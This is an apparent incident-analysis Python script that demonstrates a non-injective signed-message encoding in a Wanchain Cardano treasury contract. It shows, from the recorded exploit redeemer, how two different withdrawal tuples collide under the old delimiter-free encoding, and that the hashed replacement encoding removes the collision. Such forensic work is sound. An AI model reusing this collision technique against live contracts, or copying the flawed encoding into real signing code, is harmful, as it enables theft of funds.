#!/usr/bin/env python3
"""
PoC: Wanchain Cardano TreasuryCheck non-injective signed-message encoding.

Demonstrates, using the *actual on-chain exploit redeemer* (tx 0a4861be...),
that two distinct withdrawal tuples serialise to the SAME byte string under the
vulnerable V2 `treasurySpendCheckA` encoding (raw AppendByteString fold), and to
DIFFERENT byte strings under the replacement V3 encoding
(sha3_256 . serialiseData . ConstrData).

Read-only. No network writes. No private keys.
"""
import json
import hashlib
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(os.path.dirname(HERE), "ci-out")
os.makedirs(OUT, exist_ok=True)

# ---------------------------------------------------------------- encoders
# PlutusTx packInteger (decompiled from 485aa1... at analysis/: trace
# "entering packInteger"): 0 -> #00 ; n>0 -> minimal big-endian ; n<0 -> #80.. 
def pack_integer(n: int) -> bytes:
    if n == 0:
        return b"\x00"
    sign = b""
    if n < 0:
        sign = b"\x80"
        n = -n
    return sign + n.to_bytes((n.bit_length() + 7) // 8, "big")


def head(major: int, n: int) -> bytes:
    if n < 24:
        return bytes([(major << 5) | n])
    if n < 256:
        return bytes([(major << 5) | 24, n])
    if n < 65536:
        return bytes([(major << 5) | 25]) + n.to_bytes(2, "big")
    if n < 2 ** 32:
        return bytes([(major << 5) | 26]) + n.to_bytes(4, "big")
    return bytes([(major << 5) | 27]) + n.to_bytes(8, "big")


def enc_int(i: int) -> bytes:
    if i >= 0:
        if i < 2 ** 64:
            return head(0, i)
        b = i.to_bytes((i.bit_length() + 7) // 8, "big")
        return head(6, 2) + head(2, len(b)) + b
    i = -1 - i
    if i < 2 ** 64:
        return head(1, i)
    b = i.to_bytes((i.bit_length() + 7) // 8, "big")
    return head(6, 3) + head(2, len(b)) + b


def enc_plutus_data(x) -> bytes:
    """Canonical Plutus Data -> CBOR (what builtin.serialiseData does)."""
    k = x[0]
    if k == "constr":
        tag, fields = x[1], x[2]
        if 0 <= tag <= 6:
            h = bytes([0xD8, 121 + tag])
        elif 7 <= tag <= 127:
            h = bytes([0xD9]) + (1280 + tag - 7).to_bytes(2, "big")
        else:
            h = bytes([0xDA]) + (102 + tag).to_bytes(4, "big")
        return h + head(4, len(fields)) + b"".join(enc_plutus_data(f) for f in fields)
    if k == "int":
        return enc_int(x[1])
    if k == "bytes":
        return head(2, len(x[1])) + x[1]
    if k == "list":
        return head(4, len(x[1])) + b"".join(enc_plutus_data(f) for f in x[1])
    if k == "map":
        return head(5, len(x[1])) + b"".join(enc_plutus_data(a) + enc_plutus_data(b) for a, b in x[1])
    raise TypeError(k)


def to_data(v):
    if "constructor" in v:
        return ("constr", v["constructor"], [to_data(f) for f in v["fields"]])
    if "int" in v:
        return ("int", v["int"])
    if "bytes" in v:
        return ("bytes", bytes.fromhex(v["bytes"]))
    if "list" in v:
        return ("list", [to_data(f) for f in v["list"]])
    raise TypeError(v)


# ---------------------------------------------------------------- vulnerable encoding
def v2_message(fields):
    """treasurySpendCheckA: foldr AppendByteString over 14 fields, no delimiters.

    bytes fields emitted raw; integer fields emitted as packInteger (minimal BE,
    zero -> #00, negatives 0x80-prefixed). Signature field (13) is NOT part of
    the signed subset -- callers pass fields[:13].
    """
    out = b""
    for f in fields:
        out += f[1] if f[0] == "bytes" else pack_integer(f[1])
    return out


def v3_message(fields):
    """Replacement 8c0279...: sha3_256(serialiseData(Constr 0 fields))."""
    return hashlib.sha3_256(enc_plutus_data(("constr", 0, list(fields)))).digest()


def load_attack_redeemer():
    p = os.path.join(os.path.dirname(HERE), "analysis", "attack_tx_full.json")
    if not os.path.exists(p):
        return None
    d = json.load(open(p))
    for c in d[0]["plutus_contracts"]:
        if c["script_hash"].startswith("485a"):
            v = c["input"]["redeemer"]["datum"]["value"]
            return v["fields"][0]["fields"]
    return None


def main():
    fields_json = load_attack_redeemer()
    if fields_json is None:
        print("attack_tx_full.json missing; cannot run against the real exploit redeemer")
        return 2

    # field list as [ ('bytes', b) | ('int', n) ]
    fields = []
    for f in fields_json:
        fields.append(("bytes", bytes.fromhex(f["bytes"])) if "bytes" in f else ("int", f["int"]))

    sig = fields[13][1]
    signed = fields[:13]

    # The two tuples from the incident report (amount / adaAmount boundary shift)
    A = list(signed)
    A[4] = ("int", 203001692164714)   # 203,001,692.164714 NIGHT
    A[5] = ("int", 16)                # 16 lovelace

    B = list(signed)
    B[4] = ("int", 3097560000)        # 3,097.56 NIGHT (compatible smaller tuple)
    B[5] = ("int", 1206800)           # 1,206,800 lovelace

    ma, mb = v2_message(A), v2_message(B)
    collision = ma == mb

    da, db = v3_message(A), v3_message(B)

    # ---- ECDSA check against the real exploit-era GroupInfo key.
    # GroupInfo (attack tx ref input e4cb1352...#0) field 2 = GPK
    OLD_GPK = bytes.fromhex("0335664ecb713efe92e94b30e2273fcfcb2cc3efcb2d25a734cf119f27c7ffd98a")
    NEW_GPK = bytes.fromhex("022af71766796d1c8e2f212d7a3a0b53d150b1e1f30c4b079b7f15e40774100e9e")
    sig_old = sig_new = None
    try:
        from ecdsa import VerifyingKey, SECP256k1
        from ecdsa.util import sigdecode_string

        def vf(gpk):
            vk = VerifyingKey.from_string(gpk, curve=SECP256k1, valid_encodings=["compressed"])
            try:
                return vk.verify_digest(sig, hashlib.sha3_256(ma).digest(), sigdecode=sigdecode_string)
            except Exception:
                return False

        sig_old = vf(OLD_GPK)
        sig_new = vf(NEW_GPK)
    except Exception as e:  # noqa: BLE001
        print("ecdsa unavailable:", e)

    res = {
        "exploit_tx": "0a4861be5dd1cd0a5ccd7d38855ef8fe233563274c22c27adb4f5980535d2ea1",
        "vulnerable_script": "485aa10343f63bcc2a43f1625dc841093488e4685ba607cc187ba495",
        "replacement_script": "8c027908260ebc29410ce4fffe788da510e4d7fd67f4b39d3c77db5e",
        "collision_demonstrated": collision,
        "attacker_tuple": {"amount": A[4][1], "adaAmount": A[5][1]},
        "smaller_tuple": {"amount": B[4][1], "adaAmount": B[5][1]},
        "v2_preimage_hex_A": ma.hex(),
        "v2_preimage_hex_B": mb.hex(),
        "v2_preimage_len": len(ma),
        "v2_match": ma == mb,
        "v3_digest_A": da.hex(),
        "v3_digest_B": db.hex(),
        "v3_distinct": da != db,
        "boundary_fragment": (pack_integer(A[4][1]) + pack_integer(A[5][1])).hex(),
        "signature_len": len(sig),
        "exploit_sig_valid_under_legacy_encoding": sig_old,
        "exploit_sig_valid_under_rotated_key": sig_new,
    }
    # sanity: v3 digests over the *same* tuple must be stable
    res["v3_stable"] = v3_message(A) == da

    with open(os.path.join(OUT, "poc_results.json"), "w") as fp:
        json.dump(res, fp, indent=2)

    print(json.dumps(res, indent=2))
    print()
    print("V2 (raw concat) A==B :", collision)
    print("V2 preimage fragment :", res["boundary_fragment"])
    print("V3 (serialiseData) A!=B :", da != db)
    return 0 if (collision and da != db) else 1


if __name__ == "__main__":
    sys.exit(main())
